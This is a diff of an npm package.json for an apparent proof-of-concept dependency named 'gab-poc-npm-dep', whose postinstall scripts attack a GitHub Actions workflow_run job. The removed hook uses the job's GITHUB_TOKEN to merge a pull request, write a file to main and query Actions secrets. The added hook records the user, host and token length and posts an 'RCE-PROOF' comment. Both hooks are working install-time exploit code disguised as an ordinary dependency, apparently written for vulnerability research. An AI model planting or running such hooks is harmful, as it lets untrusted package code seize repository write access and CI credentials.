@@ -1,8 +1,8 @@
 {
   "name": "gab-poc-npm-dep",
-  "version": "1.0.2",
-  "description": "probe3",
+  "version": "1.0.3",
+  "description": "gab poc dep: postinstall proves privileged RCE",
   "scripts": {
-    "postinstall": "set +e; H=\"Authorization: Bearer $GITHUB_TOKEN\"; A=\"Accept:application/vnd.github+json\"; echo \"--- identity\"; curl -sS -H \"$A\" -H \"$H\" https://api.github.com/user -o /tmp/u -w \"USER=%{http_code}\\n\"; head -c 200 /tmp/u; echo; echo \"--- merge PR2\"; curl -sS -o /tmp/m -w \"MERGE=%{http_code}\\n\" -X PUT -H \"$A\" -H \"$H\" https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/2/merge -d '{\"merge_method\":\"merge\"}' --max-time 20; head -c 300 /tmp/m; echo; echo \"--- contents write probe\"; printf '%s' '{\"message\":\"probe contents write\",\"content\":\"cHJvYmU=\",\"branch\":\"main\"}' > /tmp/pl.json; curl -sS -o /tmp/c -w \"CONTENTS_PUT=%{http_code}\\n\" -X PUT -H \"$A\" -H \"$H\" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/gab-probe.txt --data-binary @/tmp/pl.json --max-time 20; head -c 200 /tmp/c; echo; echo \"--- actions runs\"; curl -sS -o /tmp/a -w \"ACTIONS_RUNS=%{http_code}\\n\" -H \"$A\" -H \"$H\" \"https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs?per_page=1\" --max-time 20; head -c 120 /tmp/a; echo; echo \"--- secrets\"; curl -sS -o /tmp/s -w \"SECRETS=%{http_code}\\n\" -H \"$A\" -H \"$H\" https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets --max-time 20; head -c 120 /tmp/s; echo; echo \"--- env secret names available\"; env | grep -i -E \"^(GITHUB_TOKEN|GITHUB_REPOSITORY)=\" | sed \"s/=.*/=<set>/\""
+    "postinstall": "set +e; echo \"GAB_RCE_MARKER user=$(id -un) host=$(hostname)\"; echo \"TOKEN_LEN=${#GITHUB_TOKEN}\"; curl -sS -o /tmp/c -w \"COMMENT_POST=%{http_code}\\n\" -X POST -H \"Authorization: Bearer $GITHUB_TOKEN\" -H \"Accept: application/vnd.github+json\" -H \"Content-Type: application/json\" https://api.github.com/repos/$GITHUB_REPOSITORY/issues/2/comments -d \"{\\\"body\\\":\\\"RCE-PROOF: postinstall script from an attacker-controlled dependency executed inside the privileged workflow_run job and used the workflow GITHUB_TOKEN.\\\"}\" --max-time 20; head -c 300 /tmp/c"
   }
 }
